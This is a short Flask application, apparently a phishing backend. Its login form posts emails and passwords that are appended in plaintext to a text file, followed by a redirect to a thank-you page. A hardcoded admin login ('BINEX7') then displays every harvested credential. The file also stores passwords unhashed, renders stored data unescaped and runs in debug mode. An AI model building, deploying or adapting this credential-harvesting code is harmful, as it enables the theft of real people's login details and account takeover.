from flask import Flask, request, render_template, redirect, url_for

app = Flask(__name__)

@app.route('/', methods=['GET'])
def index():
    return render_template('login.html')

@app.route('/submit', methods=['POST'])
def submit():
    email = request.form.get('email')
    password = request.form.get('password')
    with open('userdata.txt', 'a') as f:
        f.write(f'Email: {email}, Password: {password}\n')
    return redirect(url_for('thankyou'))

@app.route('/thankyou')
def thankyou():
    return render_template('thankyou.html')

@app.route('/admin_login', methods=['GET', 'POST'])
def admin_login():
    if request.method == 'POST':
        username = request.form.get('admin_user')
        password = request.form.get('admin_pass')
        if username == 'BINEX7' and password == 'BINEXisGOD':
            with open('userdata.txt', 'r') as f:
                data = f.read()
            return f'''
                <h2>Welcome Admin! Here is the saved data:</h2>
                <pre>{data}</pre>
                <a href="/admin_login">Back</a>
            '''
        else:
            return '<h3>Invalid credentials</h3><a href="/admin_login">Try again</a>'
    return render_template('admin_login.html')

if __name__ == '__main__':
    app.run(debug=True)